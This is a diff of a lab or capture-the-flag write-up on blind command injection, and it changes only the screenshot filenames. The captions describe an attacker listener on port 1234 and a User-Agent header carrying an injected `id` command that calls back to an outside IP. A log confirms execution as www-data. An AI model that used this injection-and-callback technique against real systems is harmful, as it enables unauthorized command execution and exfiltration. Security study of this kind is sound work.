@@ -119,22 +119,22 @@ Blind command injection is particularly dangerous as it's harder to detect than 
 
 ### 7. Screenshots / Logs / Payloads
 
-<figure><img src="../../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>
 
 * Screenshot 1: Login page displays "mandalorian / mandalorian" credentials and message "Admin logs your user-agent on their system", revealing User-Agent header is processed server-side.
 
-<figure><img src="../../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>
 
 * Screenshot 2: After login, page shows "Admin logs your user-agent on their system" with no direct command output, confirming blind injection nature.
 
-<figure><img src="../../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>
 
 * Screenshot 3: Attacker terminal shows python3 -m http.server 1234 listening on port 1234 to receive out-of-band callbacks.
 
-<figure><img src="../../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>
 
 * Screenshot 4: Burp Suite intercepts POST request with modified User-Agent header royal\_http/10.227.1.234:1234?command=id\`\` being sent to vulnerable endpoint.
 
-<figure><img src="../../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>
 
 * Screenshot 5: Attacker's HTTP server log shows successful callback GET /?command=uid=33(www-data) HTTP/1.1" 200, confirming blind command injection execution with www-data privileges.
